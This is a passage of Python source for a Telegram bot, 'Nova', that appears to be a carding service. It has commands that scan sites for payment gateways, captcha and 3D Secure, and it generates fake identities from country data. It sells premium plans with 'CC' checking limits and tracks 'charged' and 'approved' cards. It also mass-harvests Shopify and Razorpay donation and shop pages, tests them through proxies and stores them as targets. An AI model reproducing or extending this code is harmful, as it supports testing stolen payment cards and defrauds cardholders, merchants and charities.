    raw = (event.pattern_match.group(1) or '').strip()
    if not raw: return await styled_reply(event, f"{PE} <code>/scg site.com</code>", emoji_ids=[CE["info"]])
    url = raw.split()[0]
    if not url.startswith('http'): url = 'https://' + url
    try:
        s = await get_http_session()
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200: return await styled_reply(event, f"❌ HTTP {r.status}", emoji_ids=[CE["cross"]])
            html = await r.text()
    except Exception as e: return await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])
    await styled_reply(event, f"{PE} <b>{bs('Site Scanner')}</b>\n<b>{SEP}</b>\n📌 <code>{url[:60]}</code>\n<b>{SEP}</b>\n🛒 {bs('Gateways')}: {', '.join(_scg_gw(html)) or 'None'}\n📝 {bs('CMS')}: {', '.join(_scg_cms(html))}\n🔒 {bs('Captcha')}: {_scg_cap(html)}\n🔐 {bs('3D Secure')}: {_scg_3ds(html)}", emoji_ids=[CE["search"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ip(?:\s+(.+))?$'))
async def ip_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw: return await styled_reply(event, f"{PE} <code>/ip 8.8.8.8</code>", emoji_ids=[CE["info"]])
    ip = raw.split()[0]
    try:
        s = await get_http_session()
        async with s.get(f'http://ip-api.com/json/{ip}', timeout=aiohttp.ClientTimeout(total=10)) as r: d = await r.json(content_type=None)
        if d.get('status') == 'fail': return await styled_reply(event, f"❌ <b>{bs('Invalid IP')}</b>", emoji_ids=[CE["cross"]])
        await styled_reply(event, f"{PE} <b>{bs('IP Lookup')}</b>\n<b>{SEP}</b>\n📌 <code>{ip}</code>\n🌍 {d.get('country', '-')}\n🏙️ {d.get('city', '-')}\n📍 {d.get('regionName', '-')}\n📊 {d.get('isp', '-')}", emoji_ids=[CE["globe"]])
    except Exception as e: await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

def _iban_valid(i):
    i = i.replace(' ', '').upper()
    if not re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', i): return False
    r = i[4:] + i[:4]; n = ""
    for c in r: n += c if c.isdigit() else str(ord(c) - 55)
    return int(n) % 97 == 1

@client.on(events.NewMessage(pattern=r'(?i)^[/.]iban(?:\s+(.+))?$'))
async def iban_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw: return await styled_reply(event, f"{PE} <code>/iban GB82WEST12345698765432</code>", emoji_ids=[CE["info"]])
    ib = raw.split()[0]; ok = _iban_valid(ib)
    await styled_reply(event, f"{PE} <b>{bs('IBAN Validation')}</b>\n<b>{SEP}</b>\n📌 <code>{ib}</code>\n✅ {bs('Status')}: {'Valid' if ok else 'Invalid'}", emoji_ids=[CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fake(?:\s+(.+))?$'))
async def fake_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    arg = (event.pattern_match.group(1) or '').strip()
    if not arg or arg.lower() == 'list':
        codes = sorted(FAKE_DATA.keys())
        return await styled_reply(event, f"{PE} <b>{bs('Fake Identity')}</b>\n<b>{SEP}</b>\n✨ <code>{' '.join(codes)}</code>\n\n💡 <code>/fake US</code> · <code>/fake random</code>", emoji_ids=[CE["globe"]])
    code = random.choice(list(FAKE_DATA.keys())) if arg.lower() == 'random' else (arg.upper() if arg.upper() in FAKE_DATA else None)
    if not code: return await styled_reply(event, f"❌ <b>{bs('Unknown')}</b>: <code>{arg}</code>", emoji_ids=[CE["cross"]])
    d = FAKE_DATA[code]; first = random.choice(d['first']); last = random.choice(d['last'])
    city, state, zc = random.choice(d['cities']); street = f"{random.choice(d['streets'])} {random.randint(1, 9999)}"; phone = _fake_phone(code)
    await styled_reply(event, f"{PE} <b>{bs('Fake Identity')}</b> — <code>{code}</code>\n<b>{SEP}</b>\n👤 <b>{bs('Name')}</b> ⌁ <code>{first} {last}</code>\n🏠 <b>{bs('Street')}</b> ⌁ <code>{street}</code>\n🏙️ <b>{bs('City')}</b> ⌁ <code>{city}</code>\n📍 <b>{bs('State')}</b> ⌁ <code>{state}</code>\n🌍 <b>{bs('Country')}</b> ⌁ <code>{d['name']}</code>\n📮 <b>{bs('Zip')}</b> ⌁ <code>{zc}</code>\n📞 <b>{bs('Phone')}</b> ⌁ <code>{phone}</code>", emoji_ids=[CE["joker"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]split(?:\s+(\d+))?$'))
async def split_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    m = event.pattern_match.group(1); cs = 1000
    if m:
        try: cs = int(m)
        except Exception: cs = 1000
    cs = max(50, min(cs, 100000))
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} reply to a .txt with <code>/split 1000</code>", emoji_ids=[CE["info"]])
    reply = await event.get_reply_message()
    if not reply or not reply.file: return await styled_reply(event, f"{PE} {bs('Reply to a .txt')}", emoji_ids=[CE["warn"]])
    sm = await styled_reply(event, f"{PE} {bs('Splitting')} <code>{cs}</code>...", emoji_ids=[CE["fire"]]); path = None
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f: lines = [l.rstrip('\n') for l in (await f.read()).splitlines() if l.strip()]
    except Exception as e:
        if path and os.path.exists(path):
            try: os.remove(path)
            except Exception: pass
        return await styled_edit(sm, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])
    if path and os.path.exists(path):
        try: os.remove(path)
        except Exception: pass
    if not lines: return await styled_edit(sm, f"{PE} {bs('File empty')}", emoji_ids=[CE["warn"]])
    chunks = [lines[i:i+cs] for i in range(0, len(lines), cs)]
    for i, ch in enumerate(chunks, 1):
        fn = f"nova_split_{i}_{datetime.now().strftime('%H%M%S')}.txt"
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            for l in ch: await f.write(l + "\n")
        try: await send_file_entities(event.chat_id, fn, f"{PE} <b>{bs('Part')} {i}/{len(chunks)}</b> · <code>{len(ch)}</code>")
        except Exception: pass
        try: os.remove(fn)
        except Exception: pass
    await styled_edit(sm, f"✅ <b>{bs('Split complete')}</b> · {len(lines)} → {len(chunks)}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fb$'))
async def fb_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} {bs('Reply to a media message with')} <code>/fb</code>", emoji_ids=[CE["info"]])
    reply = await event.get_reply_message()
    if not (reply.media or reply.photo or reply.document or reply.video): return await styled_reply(event, f"{PE} {bs('No media')}", emoji_ids=[CE["warn"]])
    try:
        await client_instance.forward_messages(GROUP_FORWARD_ID, reply)
        await styled_reply(event, f"✅ {bs('Forwarded.')}", emoji_ids=[CE["check"]])
    except Exception as e: await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

# ── Keys ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkeys\s+'))
async def genkeys_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    p = event.raw_text.split()
    if len(p) < 5: return await styled_reply(event, f"{PE} <code>/genkeys count hours max_users cc_limit [price]</code>", emoji_ids=[CE["info"]])
    try:
        cnt = int(p[1]); hrs = int(p[2]); mx = int(p[3]); cc = int(p[4]); pr = float(p[5]) if len(p) > 5 else 0.0
    except Exception: return await styled_reply(event, f"❌ <b>{bs('Invalid numbers')}</b>", emoji_ids=[CE["cross"]])
    if cnt < 1 or cnt > 100: return await styled_reply(event, f"{PE} <b>{bs('Count 1-100')}</b>", emoji_ids=[CE["warn"]])
    kd = load_keys(); now = datetime.now(); exp = (now + timedelta(hours=hrs)).isoformat(); gen = []
    for _ in range(cnt):
        k = gen_key()
        while k in kd: k = gen_key()
        kd[k] = {"hours": hrs, "max_users": mx, "cc_limit": cc, "price": pr, "created_at": now.isoformat(), "created_by": event.sender_id, "expiry": exp, "used_by": [], "used_count": 0}
        gen.append(k)
    save_keys(kd); hd = f"{hrs}h" if hrs < 24 else f"{hrs//24}d"; pd = f"${pr:.2f}" if pr else "Free"
    t = f"{PE} <b>{bs('Keys generated')}</b> (x{cnt})\n<b>{SEP}</b>\n" + "\n".join(f"┣ <code>{k}</code>" for k in gen) + f"\n<b>{SEP}</b>\n📅 {bs('Valid')}: {hd}\n👥 {bs('Users')}: {mx}\n💳 {bs('CC')}: {cc}\n💰 {bs('Price')}: {pd}\n⏰ {bs('Expiry')}: {exp[:16]}\n\n✅ {bs('Redeem:')} <code>/redeem KEY</code>"
    await styled_reply(event, t, emoji_ids=[CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\s+'))
async def redeem_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    uid = event.sender_id; p = event.raw_text.split(maxsplit=1)
    if len(p) < 2: return await styled_reply(event, f"{PE} <code>/redeem NOVA_XXXX</code>", emoji_ids=[CE["info"]])
    key = p[1].strip().upper(); kd = load_keys()
    if key not in kd: return await styled_reply(event, f"❌ <b>{bs('Invalid key')}</b>", emoji_ids=[CE["cross"]])
    e = kd[key]; now = datetime.now()
    try:
        if now > datetime.fromisoformat(e.get('expiry', '')): return await styled_reply(event, f"❌ <b>{bs('Key expired')}</b>", emoji_ids=[CE["cross"]])
    except Exception: pass
    ub = e.get('used_by', []); mx = int(e.get('max_users', 1))
    if uid in ub: return await styled_reply(event, f"❌ <b>{bs('Already used')}</b>", emoji_ids=[CE["warn"]])
    if len(ub) >= mx: return await styled_reply(event, f"❌ <b>{bs('Key max users reached')}</b>", emoji_ids=[CE["cross"]])
    if await is_premium_user(uid): return await styled_reply(event, f"❌ <b>{bs('Already premium')}</b>", emoji_ids=[CE["warn"]])
    hrs = int(e.get('hours', DEFAULT_KEY_HOURS)); cc = int(e.get('cc_limit', DEFAULT_KEY_CC_LIMIT)); days = max(1, hrs // 24)
    await set_user_plan(uid, "Core", days)
    e['used_by'] = ub + [uid]; e['used_count'] = int(e.get('used_count', 0)) + 1; kd[key] = e; save_keys(kd)
    hd = f"{hrs}h" if hrs < 24 else f"{hrs//24}d"
    await styled_reply(event, f"🎉 <b>{bs('Premium activated')}</b>\n<b>{SEP}</b>\n📅 {bs('Duration')}: <code>{hd}</code>\n💳 {bs('CC limit')}: <code>{cc}</code>", emoji_ids=[CE["party"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]listkeys$'))
async def listkeys_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    kd = load_keys()
    if not kd: return await styled_reply(event, f"{PE} <b>{bs('No keys')}</b>", emoji_ids=[CE["warn"]])
    now = datetime.now(); lines = []
    for k, v in list(kd.items())[:50]:
        hrs = v.get('hours', '?'); u = v.get('used_count', 0); mx = v.get('max_users', 1); ex = v.get('expiry', '')[:16]
        st = "✅" if now.isoformat() < ex else "❌"; lines.append(f"{st} <code>{k}</code>\n    {hrs}h · {u}/{mx} · exp {ex}")
    extra = f"\n<i>+{len(kd)-50} more</i>" if len(kd) > 50 else ""
    await styled_reply(event, f"{PE} <b>{bs('Keys')}</b> ({len(kd)})\n<b>{SEP}</b>\n" + "\n".join(lines) + extra, emoji_ids=[CE["star"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]delkey\s+'))
async def delkey_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    p = event.raw_text.split(maxsplit=1)
    if len(p) < 2: return await styled_reply(event, f"{PE} <code>/delkey NOVA_XXXX</code>", emoji_ids=[CE["info"]])
    k = p[1].strip().upper(); kd = load_keys()
    if k not in kd: return await styled_reply(event, f"❌ <b>{bs('Not found')}</b>", emoji_ids=[CE["cross"]])
    del kd[k]; save_keys(kd)
    await styled_reply(event, f"✅ <b>{bs('Deleted')}</b> <code>{k}</code>", emoji_ids=[CE["check"]])

# ── Admin ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID: return
    a = event.raw_text.lower().split()[1]; await set_maintenance_mode(a == "on")
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])

async def _plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    p = event.raw_text.split()
    if len(p) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: tgt = int(p[1])
    except Exception: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try:
        ent = await client_instance.get_entity(tgt); tn = getattr(ent, 'first_name', None) or "Unknown"
    except Exception: tn = "Unknown"
    await ensure_user(tgt); cur = await get_user_plan(tgt); up = is_paid_plan(cur)
    await set_user_plan(tgt, pi["tier"], pi["duration_days"])
    ed = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"<b>✅ {bs('Plan Updated')}</b>\n<a href='{OWNER_LINK}'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={tgt}'>{tn}</a>\n<a href='{OWNER_LINK}'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='{OWNER_LINK}'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{ed}</code>")
    try: await styled_send(tgt, f"<b>🎉 {bs('Plan Upgraded!')} 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\n{bs('Limit')}: {get_cc_limit(pi['tier'])} CCs\n{bs('Expires')}: {ed}")
    except Exception: pass
    try:
        rid = f"NOVA-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"; lt = f"{bs('Plan RENEWED')} 🔄" if up else f"{bs('New Plan')} 🛒"
        await styled_send(LOG_CHANNEL_ID, f"<b>{lt}</b>\n<a href='tg://user?id={tgt}'>{tn}</a> ━ {pi['emoji']}{pi['name']} ━ {pi['price']} ━ {rid}")
    except Exception: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _plan_assign(event, "plan4")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    p = event.raw_text.split()
    if len(p) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: tgt = int(p[1])
    except Exception: return await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(tgt); cp = await get_user_plan(tgt)
    if not is_paid_plan(cp): return await styled_reply(event, f"{PE} <b>{bs('No active plan')}</b>", emoji_ids=[CE["cross"]])
    try:
        ent = await client_instance.get_entity(tgt); tn = getattr(ent, 'first_name', None) or "?"
    except Exception: tn = "?"
    await set_user_plan(tgt, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try: await styled_send(tgt, f"{PE} <b>{bs('Your plan has ended. Contact admin.')}</b>", emoji_ids=[CE["warn"]])
    except Exception: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    all_ = []
    for tier in PAID_TIERS:
        async for u in db["users"].find({"plan": tier}): all_.append(u)
    if not all_: return await styled_reply(event, f"{PE} <b>{bs('No active plans')}</b>", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"; c = f"ACTIVE PLANS ({len(all_)})\n{'='*40}\n"
    for u in all_:
        uid2 = u.get("user_id", "?"); tier = u.get("plan", "?"); exp = u.get("expiry"); es = exp.strftime('%Y-%m-%d') if exp else "?"
        try:
            e = await client_instance.get_entity(uid2); un = getattr(e, 'first_name', None) or "?"
        except Exception: un = "?"
        c += f"{un} | {uid2} | {tier} | {es}\n"
    async with aiofiles.open(fn, 'w') as f: await f.write(c)
    try: await styled_send(event.chat_id, f"{PE} <b>{bs('Plans')} ({len(all_)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except Exception: pass
    try: os.remove(fn)
    except Exception: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count(); ts = await get_total_sites_count(); tc = await get_total_cards_count(); ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"{PE} <b>{bs('Stats')}</b>\n<b>{SEP}</b>\n{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>\n{PE} <b>{bs('Sites')}:</b> <code>{ts}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>\n{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>\n<b>{SEP}</b>\n{PE} <b>MSP:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code>\n{PE} <b>MRZ:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code>", emoji_ids=[CE["fire"],CE["fire"],CE["chart"],CE["link"],CE["gem"]])
    except Exception as e: await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try: await styled_reply(event, await _build_status_text(), buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except Exception as e: await styled_reply(event, f"⚠️ <code>{e}</code>")

@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text()
        msg = event.message if hasattr(event, 'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except Exception: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]broadcast\s+'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    p = event.raw_text.split(maxsplit=1)
    if len(p) < 2: return await styled_reply(event, f"{PE} <code>/broadcast message</code>", emoji_ids=[CE["info"]])
    msg = p[1]; sent = 0
    try:
        async for u in db["users"].find({}):
            try:
                await styled_send(u.get("user_id"), msg, emoji_ids=[CE["fire"]]); sent += 1
                await asyncio.sleep(0.05)
            except Exception: pass
    except Exception: pass
    await styled_reply(event, f"✅ {bs('Sent to')} <code>{sent}</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]refstats$'))
async def refstats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    d = load_refs(); tu = len(d["users"])
    tc = sum(len(u.get("rewarded", [])) for u in d["users"].values()); tp = sum(len(u.get("pending", [])) for u in d["users"].values())
    await styled_reply(event, f"{PE} <b>{bs('Referral Stats')}</b>\n<b>{SEP}</b>\n👥 {bs('Users')}: <code>{tu}</code>\n✅ {bs('Confirmed')}: <code>{tc}</code>\n⏳ {bs('Pending')}: <code>{tp}</code>", emoji_ids=[CE["chart"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]refreset\s+'))
async def refreset_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    p = event.raw_text.split(maxsplit=1)
    if len(p) < 2: return await styled_reply(event, f"{PE} <code>/refreset user_id</code>", emoji_ids=[CE["info"]])
    try: tgt = int(p[1])
    except Exception: return await styled_reply(event, f"❌ <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    if reset_refs_for_user(tgt): await styled_reply(event, f"✅ <b>{bs('Reset')}</b> <code>{tgt}</code>", emoji_ids=[CE["check"]])
    else: await styled_reply(event, f"⚠️ <b>{bs('No data')}</b>", emoji_ids=[CE["warn"]])

# ── Fetchers ──
_SHOPIFY_DIR = ["https://shop.app/api/search", "https://shop.app/api/storefronts"]
_RZ_HINTS = ["donate","donation","pay","payment","paynow","checkout","fees","booking","book","order","store","shop","buy","buynow","cart","subscription","subscribe","register","registration","ticket","tickets","entry","course","schoolfees","collegefees","support","supportus","seva","daan","help","sponsor","fund","temple","church","mandir","ashram","trust","foundation","ngo","charity","welfare","trial","starter","basic","premium","annual","monthly"]

def _walk_urls(o, d=0):
    if d > 6: return
    if isinstance(o, str):
        if "myshopify.com" in o or (o.startswith("http") and "." in o): yield o
        return
    if isinstance(o, dict):
        for v in o.values(): yield from _walk_urls(v, d + 1)
    elif isinstance(o, list):
        for v in o: yield from _walk_urls(v, d + 1)

def _norm_sh_domain(raw):
    if not raw: return ""
    s = str(raw).strip().lower(); s = re.sub(r'^https?://', '', s); s = s.rstrip('/').split('/')[0].split('?')[0]
    if s.startswith('www.'): s = s[4:]
    if not s or '.' not in s: return ""
    return s if re.match(r'^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$', s) else ""

async def _fetch_sh_stores(kw="", cnt=200):
    seen, out = set(), []
    try:
        k = kw.strip().lower() or random.choice(DEFAULT_KEYWORD_STEMS)
        prm = {"query": k, "limit": min(cnt, 250)}; s = await get_http_session()
        for url in _SHOPIFY_DIR:
            if len(out) >= cnt: break
            try:
                async with s.get(url, params=prm, timeout=aiohttp.ClientTimeout(total=15), headers={"User-Agent": "Mozilla/5.0"}) as r:
                    if r.status != 200: continue
                    try: data = await r.json(content_type=None)
                    except Exception: continue
                    for u in _walk_urls(data):
                        d = _norm_sh_domain(u)
                        if d and d not in seen: seen.add(d); out.append(d)
                        if len(out) >= cnt: break
            except Exception: continue
    except Exception: pass
    if len(out) < cnt:
        stems = list(DEFAULT_KEYWORD_STEMS)
        if kw:
            k2 = re.sub(r'[^a-z0-9\-]', '', kw.lower())
            if k2: stems = [k2] + [f"{k2}{s}" for s in ("shop", "store", "co")] + stems
        for stem in stems:
            if len(out) >= cnt: break
            stem = re.sub(r'[^a-z0-9\-]', '', stem.lower())
            if not stem: continue
            for suf in ["", "shop", "store", "co", "us", "uk"]:
                if len(out) >= cnt: break
                d = f"{stem}{suf}.myshopify.com" if suf else f"{stem}.myshopify.com"
                if d not in seen: seen.add(d); out.append(d)
    return out[:cnt]

async def _fetch_rz_stores(kw="", cnt=100):
    seen, out = set(), []; hints = list(_RZ_HINTS)
    if kw:
        k = re.sub(r'[^a-z0-9\-]', '', kw.lower())
        if k: hints = [k] + [f"{k}{s}" for s in ("now","pay","donate","page")] + hints
    for slug in hints:
        if len(out) >= cnt: break
        u = f"https://pages.razorpay.com/{slug}"
        if u not in seen: seen.add(u); out.append(u)
    for city in ["delhi","mumbai","bangalore","chennai","kolkata","pune"]:
        if len(out) >= cnt: break
        u = f"https://pages.razorpay.com/iic{city}"
        if u not in seen: seen.add(u); out.append(u)
    return out[:cnt]

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fetshsites(?:\s+(\d+))?(?:\s+(.+))?$'))
async def fetshsites_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m = event.pattern_match; cnt = int(m.group(1)) if m.group(1) else 200; cnt = max(10, min(cnt, 2000)); kw = (m.group(2) or "").strip()
    kd = f" · kw: <code>{kw}</code>" if kw else ""
    sm = await styled_reply(event, f"{PE} <b>{bs('Fetching Shopify stores')}</b>\n{SEP}\n🎯 <code>{cnt}</code>{kd}", emoji_ids=[CE["search"]])
    try:
        cands = await _fetch_sh_stores(kw, cnt)
        if not cands: return await styled_edit(sm, f"❌ <b>{bs('No candidates')}</b>", emoji_ids=[CE["cross"]])
        proxies = await get_all_user_proxies(event.sender_id) or []
        proxy = proxies[0] if proxies else None; sem = get_user_sem(event.sender_id, "site"); alive = []; ck = 0; last = [0.0]
        async def work(dom):
            nonlocal ck
            async with sem:
                try: res = await test_site(f"https://{dom}", proxy)
                except Exception: res = {"status": "dead"}
            ck += 1
            if res.get("status") in ("alive","over"): alive.append(dom)
            if time.time() - last[0] > 2.0:
                last[0] = time.time()
                try: await styled_edit(sm, f"{PE} <b>{bs('Testing')}</b> {ck}/{len(cands)}\n✅ {bs('Alive')}: <code>{len(alive)}</code>", emoji_ids=[CE["fire"]])
                except Exception: pass
        for i in range(0, len(cands), SITE_PER_USER_WORKERS):
            await asyncio.gather(*[work(d) for d in cands[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
        added = 0
        for d in alive:
            if await add_site_db(event.sender_id, d): added += 1
        await styled_edit(sm, f"✅ <b>{bs('Fetch complete')}</b>\n<b>{SEP}</b>\n📥 {len(cands)} · ✅ {len(alive)} · ➕ {added}", emoji_ids=[CE["check"]])
    except Exception as e: await styled_edit(sm, f"❌ <code>{str(e)[:120]}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fetrzsites(?:\s+(\d+))?(?:\s+(.+))?$'))
async def fetrzsites_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m = event.pattern_match; cnt = int(m.group(1)) if m.group(1) else 100; cnt = max(10, min(cnt, 500)); kw = (m.group(2) or "").strip()
    sm = await styled_reply(event, f"{PE} <b>{bs('Fetching Razorpay sites')}</b>\n{SEP}\n🎯 <code>{cnt}</code>", emoji_ids=[CE["search"]])
    try:
        cands = await _fetch_rz_stores(kw, cnt)
        if not cands: return await styled_edit(sm, f"❌ <b>{bs('No candidates')}</b>", emoji_ids=[CE["cross"]])
        preview = "\n".join(f"<code>{u}</code>" for u in cands[:20])
        await styled_edit(sm, f"✅ <b>{bs('Candidates ready')}</b>\n<b>{SEP}</b>\n📥 <code>{len(cands)}</code>\n\n{preview}\n\n<i>{bs('Use /rz to check')}</i>", emoji_ids=[CE["check"]])
    except Exception as e: await styled_edit(sm, f"❌ <code>{str(e)[:120]}</code>", emoji_ids=[CE["cross"]])

# ── Background loops ──
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            now = datetime.utcnow()
            await db["users"].update_many({"expiry": {"$lt": now}, "plan": {"$in": PAID_TIERS}}, {"$set": {"plan": "Bronze", "expiry": None}})
        except Exception as e: log_system("CLEANUP", f"{e}", "error")

# ═════════ MAIN ═════════
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    log_system("BOOT", f"Starting {BOT_BRAND} v4.0.0...")
    log_system("BOOT", f"Bot: {BOT_USERNAME} | Owner: {OWNER_TAG}")
    log_system("BOOT", f"Admins: {ADMIN_ID}")
    log_system("BOOT", f"Shopify API: {API_BASE_URL[:60]}")
    log_system("BOOT", f"Razorpay API: {RAZORPAY_API_URL[:60]}")
    asyncio.create_task(premium_cleanup_loop())
    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot online.")
            me = await client.get_me()
            log_system("BOOT", f"  bot=@{me.username} id={me.id}")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning"); await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{type(e).__name__}: {e}", "error"); await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
